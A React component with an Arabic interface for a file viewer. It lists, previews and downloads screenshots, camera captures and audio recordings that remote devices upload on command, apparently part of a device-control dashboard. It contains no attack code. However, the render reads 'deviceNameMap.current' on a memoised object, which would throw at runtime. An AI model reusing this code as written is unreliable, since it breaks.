'use client'

import React, { useState, useEffect, useRef, useMemo } from 'react'
import { motion } from 'framer-motion'
import {
  FolderOpen,
  RefreshCw,
  Download,
  Eye,
  File as FileIcon,
  Image as ImageIcon,
  Film,
  Music,
  FileText,
  Loader2,
  Inbox,
  Clock,
  AlertCircle,
  HardDrive,
} from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from '@/components/ui/dialog'
import api, { type FileItem, type Device } from '@/lib/api'
import { cn, formatTimestamp, timeAgo, timeUntil, addLog } from '@/lib/utils'

interface Props {
  /** Map of device_id → device (for showing device names) */
  devices: Device[]
  /** Optional device filter — if provided, only show files for this device */
  filterDeviceId?: string
}

/* ─── Helpers ────────────────────────────────────────── */
type FileKind = 'image' | 'video' | 'audio' | 'file'

function kindFromFileType(fileType: string): FileKind {
  switch (fileType) {
    case 'photo':
    case 'screenshot':
    case 'camera':
      return 'image'
    case 'video':
      return 'video'
    case 'audio':
      return 'audio'
    default:
      return 'file'
  }
}

function formatBytes(bytes: number): string {
  if (!bytes || bytes <= 0) return '0 B'
  const units = ['B', 'KB', 'MB', 'GB']
  let val = bytes
  let unit = 0
  while (val >= 1024 && unit < units.length - 1) {
    val /= 1024
    unit++
  }
  return `${val.toFixed(val < 10 && unit > 0 ? 1 : 0)} ${units[unit]}`
}

function kindIcon(kind: FileKind) {
  switch (kind) {
    case 'image':
      return ImageIcon
    case 'video':
      return Film
    case 'audio':
      return Music
    default:
      return FileText
  }
}

function kindColor(kind: FileKind) {
  switch (kind) {
    case 'image':
      return 'text-purple-400 bg-purple-500/15'
    case 'video':
      return 'text-pink-400 bg-pink-500/15'
    case 'audio':
      return 'text-cyan-400 bg-cyan-500/15'
    default:
      return 'text-slate-400 bg-slate-700/40'
  }
}

function kindLabel(kind: FileKind) {
  switch (kind) {
    case 'image':
      return 'صورة'
    case 'video':
      return 'فيديو'
    case 'audio':
      return 'صوت'
    default:
      return 'ملف'
  }
}

/* ─── Component ──────────────────────────────────────── */
export default function FileViewer({ devices, filterDeviceId }: Props) {
  const [files, setFiles] = useState<FileItem[]>([])
  const [loading, setLoading] = useState(true)

  // Viewing state
  const [viewing, setViewing] = useState<FileItem | null>(null)
  const [viewUrl, setViewUrl] = useState<string | null>(null)
  const [viewLoading, setViewLoading] = useState(false)
  const [viewError, setViewError] = useState<string | null>(null)

  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // Compute device name map reactively (not a ref)
  const deviceNameMap = useMemo(() => {
    const map: Record<string, string> = {}
    for (const d of devices) {
      map[d.id] = d.name || d.model || d.id
    }
    return map
  }, [devices])

  useEffect(() => {
    let cancelled = false
    addLog('info', 'تحميل الملفات المرفوعة')

    async function load() {
      try {
        const res = await api.getFiles(filterDeviceId)
        if (cancelled) return
        if (res.ok && res.files) {
          const list = (res.files as FileItem[]).sort(
            (a, b) =>
              new Date(b.uploaded_at).getTime() -
              new Date(a.uploaded_at).getTime()
          )
          setFiles(list)
        } else {
          addLog('error', 'فشل تحميل الملفات', res.message)
        }
      } catch (err: unknown) {
        if (cancelled) return
        const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
        addLog('error', 'خطأ في تحميل الملفات', msg)
      } finally {
        if (!cancelled) setLoading(false)
      }
    }

    const poll = async () => {
      try {
        const res = await api.getFiles(filterDeviceId)
        if (cancelled) return
        if (res.ok && res.files) {
          const list = (res.files as FileItem[]).sort(
            (a, b) =>
              new Date(b.uploaded_at).getTime() -
              new Date(a.uploaded_at).getTime()
          )
          setFiles(list)
        }
      } catch {
        // silent
      }
    }

    load()
    pollRef.current = setInterval(poll, 30000)
    return () => {
      cancelled = true
      if (pollRef.current) clearInterval(pollRef.current)
    }
  }, [filterDeviceId])

  const handleManualRefresh = () => {
    setLoading(true)
    api.getFiles(filterDeviceId)
      .then((res) => {
        if (res.ok && res.files) {
          const list = (res.files as FileItem[]).sort(
            (a, b) =>
              new Date(b.uploaded_at).getTime() -
              new Date(a.uploaded_at).getTime()
          )
          setFiles(list)
        } else {
          addLog('error', 'فشل تحميل الملفات', res.message)
        }
      })
      .catch((err: unknown) => {
        const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
        addLog('error', 'خطأ في تحميل الملفات', msg)
      })
      .finally(() => setLoading(false))
  }

  const handleView = async (file: FileItem) => {
    setViewing(file)
    setViewUrl(null)
    setViewError(null)
    setViewLoading(true)
    try {
      const blob = await api.fetchFileBlob(file.id)
      if (blob) {
        const url = URL.createObjectURL(blob)
        setViewUrl(url)
        addLog('success', `تم فتح الملف: ${file.filename}`)
      } else {
        setViewError('تعذّر تحميل الملف — قد يكون منتهي الصلاحية')
        addLog('error', 'فشل تحميل الملف للعرض', file.filename)
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
      setViewError(msg)
      addLog('error', 'خطأ في عرض الملف', msg)
    } finally {
      setViewLoading(false)
    }
  }

  const closeViewer = () => {
    if (viewUrl) {
      setTimeout(() => URL.revokeObjectURL(viewUrl), 100)
    }
    setViewing(null)
    setViewUrl(null)
    setViewError(null)
  }

  const handleDownload = async (file: FileItem) => {
    addLog('info', `تنزيل الملف: ${file.filename}`)
    try {
      const blob = await api.fetchFileBlob(file.id)
      if (!blob) {
        addLog('error', 'فشل تنزيل الملف — قد يكون منتهي الصلاحية')
        return
      }
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      // Strip the uuid prefix from filename if present
      const fname = file.filename.replace(/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}_/, '')
      a.download = fname
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
      setTimeout(() => URL.revokeObjectURL(url), 1500)
      addLog('success', `تم تنزيل: ${fname}`)
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
      addLog('error', 'خطأ في التنزيل', msg)
    }
  }

  // Compute remaining time before expiry (uses timeUntil utility which reads Date.now internally)
  const formatExpiresIn = (expiresAt: string) => timeUntil(expiresAt)

  // Group files by kind for nicer display
  const grouped: Record<FileKind, FileItem[]> = {
    image: [],
    video: [],
    audio: [],
    file: [],
  }
  for (const f of files) {
    grouped[kindFromFileType(f.file_type)].push(f)
  }

  const totalCount = files.length
  const totalSize = files.reduce((sum, f) => sum + (f.size || 0), 0)

  return (
    <div className="space-y-4">
      {/* Top bar */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <FolderOpen className="w-5 h-5 text-emerald-400" />
          <h2 className="text-lg font-semibold text-white">الملفات</h2>
          <Badge className="bg-slate-700/50 text-slate-300 border-slate-600/30 text-xs">
            {totalCount}
          </Badge>
          {totalSize > 0 && (
            <Badge className="bg-slate-700/50 text-slate-300 border-slate-600/30 text-xs gap-1">
              <HardDrive className="w-3 h-3" />
              {formatBytes(totalSize)}
            </Badge>
          )}
        </div>
        <Button
          variant="ghost"
          size="sm"
          onClick={handleManualRefresh}
          disabled={loading}
          className="text-slate-400 hover:text-white hover:bg-slate-800"
        >
          <RefreshCw className={cn('w-4 h-4', loading && 'animate-spin')} />
          <span className="hidden sm:inline">تحديث</span>
        </Button>
      </div>

      {/* Expiry notice */}
      <div className="flex items-start gap-2 p-3 rounded-lg bg-amber-500/10 border border-amber-500/20 text-amber-300 text-xs">
        <Clock className="w-4 h-4 shrink-0 mt-0.5" />
        <p className="leading-relaxed">
          تُحذف الملفات تلقائياً بعد ساعة من رفعها. الوقت المتبقي موضّح لكل ملف.
        </p>
      </div>

      {loading && files.length === 0 ? (
        <div className="space-y-2">
          {Array.from({ length: 6 }).map((_, i) => (
            <div
              key={i}
              className="h-16 w-full rounded-xl bg-slate-800/60 animate-pulse"
            />
          ))}
        </div>
      ) : totalCount === 0 ? (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="flex flex-col items-center justify-center py-16 text-slate-400"
        >
          <Inbox className="w-12 h-12 mb-3 text-slate-600" />
          <p className="text-base font-medium">لا توجد ملفات مرفوعة</p>
          <p className="text-sm mt-1 text-center px-4">
            ستظهر هنا الملفات التي يرسلها الجهاز عبر أوامر مثل «لقطة شاشة» أو «الكاميرا» أو «تسجيل الصوت»
          </p>
        </motion.div>
      ) : (
        <div className="space-y-5">
          {(['image', 'video', 'audio', 'file'] as FileKind[]).map((kind) => {
            const group = grouped[kind]
            if (group.length === 0) return null
            const Icon = kindIcon(kind)
            return (
              <div key={kind} className="space-y-2">
                <div className="flex items-center gap-2">
                  <Icon className={cn('w-4 h-4', kindColor(kind).split(' ')[0])} />
                  <h3 className="text-sm font-medium text-slate-300">
                    {kindLabel(kind)}
                  </h3>
                  <Badge className="bg-slate-700/50 text-slate-300 border-slate-600/30 text-[10px]">
                    {group.length}
                  </Badge>
                </div>
                <div
                  className="max-h-96 overflow-y-auto rounded-xl border border-slate-800/50 bg-slate-900/50"
                  style={{
                    scrollbarWidth: 'thin',
                    scrollbarColor: 'rgba(255,255,255,0.15) transparent',
                  }}
                >
                  <div className="divide-y divide-slate-800/50">
                    {group.map((file) => {
                      const kindNow = kindFromFileType(file.file_type)
                      const IconNow = kindIcon(kindNow)
                      const expires = formatExpiresIn(file.expires_at)
                      const devName =
                        deviceNameMap.current[file.device_id] || file.device_id
                      return (
                        <div
                          key={file.id}
                          className="flex items-center gap-3 p-3 hover:bg-slate-800/30 transition-colors"
                        >
                          <div
                            className={cn(
                              'p-2 rounded-lg shrink-0',
                              kindColor(kindNow)
                            )}
                          >
                            <IconNow className="w-4 h-4" />
                          </div>
                          <div className="min-w-0 flex-1">
                            <p
                              className="text-sm text-slate-200 font-medium truncate"
                              dir="auto"
                              title={file.filename}
                            >
                              {file.filename.replace(
                                /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}_/,
                                ''
                              )}
                            </p>
                            <div className="flex items-center gap-2 mt-0.5 flex-wrap text-xs text-slate-500">
                              <span>{formatBytes(file.size)}</span>
                              <span>•</span>
                              <span className="truncate max-w-[120px]" title={devName}>
                                {devName}
                              </span>
                              <span>•</span>
                              <span>{timeAgo(file.uploaded_at)}</span>
                            </div>
                          </div>
                          {/* Expiry badge */}
                          <div className="flex flex-col items-end shrink-0">
                            <Badge
                              className={cn(
                                'text-[9px] gap-1',
                                expires.urgent
                                  ? 'bg-red-500/15 text-red-400 border-red-500/25'
                                  : 'bg-slate-700/40 text-slate-400 border-slate-600/30'
                              )}
                            >
                              <Clock className="w-2.5 h-2.5" />
                              {expires.text}
                            </Badge>
                            {file.retrieved && (
                              <span className="text-[9px] text-emerald-400/70 mt-0.5">
                                تم الجلب
                              </span>
                            )}
                          </div>
                          {/* Actions */}
                          <div className="flex items-center gap-1 shrink-0">
                            <Button
                              variant="ghost"
                              size="icon-sm"
                              onClick={() => handleView(file)}
                              disabled={viewLoading && viewing?.id === file.id}
                              className="text-slate-400 hover:text-emerald-400 hover:bg-emerald-500/10"
                              title="عرض"
                            >
                              {viewLoading && viewing?.id === file.id ? (
                                <Loader2 className="w-3.5 h-3.5 animate-spin" />
                              ) : (
                                <Eye className="w-3.5 h-3.5" />
                              )}
                            </Button>
                            <Button
                              variant="ghost"
                              size="icon-sm"
                              onClick={() => handleDownload(file)}
                              className="text-slate-400 hover:text-emerald-400 hover:bg-emerald-500/10"
                              title="تنزيل"
                            >
                              <Download className="w-3.5 h-3.5" />
                            </Button>
                          </div>
                        </div>
                      )
                    })}
                  </div>
                </div>
              </div>
            )
          })}
        </div>
      )}

      {/* View dialog */}
      <Dialog
        open={!!viewing}
        onOpenChange={(open: boolean) => {
          if (!open) closeViewer()
        }}
      >
        <DialogContent className="bg-slate-900 border-slate-800/80 sm:max-w-2xl p-0 overflow-hidden">
          <DialogHeader className="p-4 border-b border-slate-800/60">
            <DialogTitle className="text-white text-sm flex items-center gap-2">
              {viewing && (() => {
                const Icon = kindIcon(kindFromFileType(viewing.file_type))
                return <Icon className="w-4 h-4 text-emerald-400" />
              })()}
              <span className="truncate" dir="auto">
                {viewing?.filename.replace(
                  /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}_/,
                  ''
                )}
              </span>
            </DialogTitle>
            <DialogDescription className="text-slate-400 text-xs">
              {viewing && `${formatBytes(viewing.size)} • ${kindLabel(kindFromFileType(viewing.file_type))} • ${formatTimestamp(viewing.uploaded_at)}`}
            </DialogDescription>
          </DialogHeader>

          <div className="p-4">
            {viewLoading ? (
              <div className="flex flex-col items-center justify-center py-16 text-slate-400">
                <Loader2 className="w-8 h-8 mb-3 text-emerald-400 animate-spin" />
                <p className="text-sm">جارٍ تحميل الملف...</p>
              </div>
            ) : viewError ? (
              <div className="flex flex-col items-center justify-center py-16 text-red-400">
                <AlertCircle className="w-8 h-8 mb-3" />
                <p className="text-sm">{viewError}</p>
              </div>
            ) : viewUrl ? (
              <div className="flex flex-col items-center">
                {viewing && kindFromFileType(viewing.file_type) === 'image' && (
                  <img
                    src={viewUrl}
                    alt={viewing.filename}
                    className="max-w-full max-h-[60vh] rounded-lg border border-slate-800/50"
                  />
                )}
                {viewing && kindFromFileType(viewing.file_type) === 'video' && (
                  <video
                    src={viewUrl}
                    controls
                    className="max-w-full max-h-[60vh] rounded-lg border border-slate-800/50"
                  />
                )}
                {viewing && kindFromFileType(viewing.file_type) === 'audio' && (
                  <div className="w-full p-4 rounded-lg bg-slate-800/40">
                    <div className="flex items-center gap-3 mb-3">
                      <Music className="w-8 h-8 text-cyan-400" />
                      <div>
                        <p className="text-sm text-slate-200">ملف صوتي</p>
                        <p className="text-xs text-slate-500">
                          {formatBytes(viewing.size)}
                        </p>
                      </div>
                    </div>
                    <audio src={viewUrl} controls className="w-full" />
                  </div>
                )}
                {viewing && kindFromFileType(viewing.file_type) === 'file' && (
                  <div className="flex flex-col items-center justify-center py-16 text-slate-400">
                    <FileIcon className="w-12 h-12 mb-3 text-slate-600" />
                    <p className="text-sm">لا يمكن عرض هذا النوع من الملفات مباشرة</p>
                    <Button
                      size="sm"
                      onClick={() => viewing && handleDownload(viewing)}
                      className="mt-4 bg-emerald-600 hover:bg-emerald-500 text-white"
                    >
                      <Download className="w-4 h-4" />
                      تنزيل الملف
                    </Button>
                  </div>
                )}
                {viewing && (
                  <div className="mt-4 flex justify-center gap-2">
                    <Button
                      size="sm"
                      onClick={() => handleDownload(viewing)}
                      className="bg-emerald-600 hover:bg-emerald-500 text-white"
                    >
                      <Download className="w-4 h-4" />
                      تنزيل
                    </Button>
                  </div>
                )}
              </div>
            ) : null}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
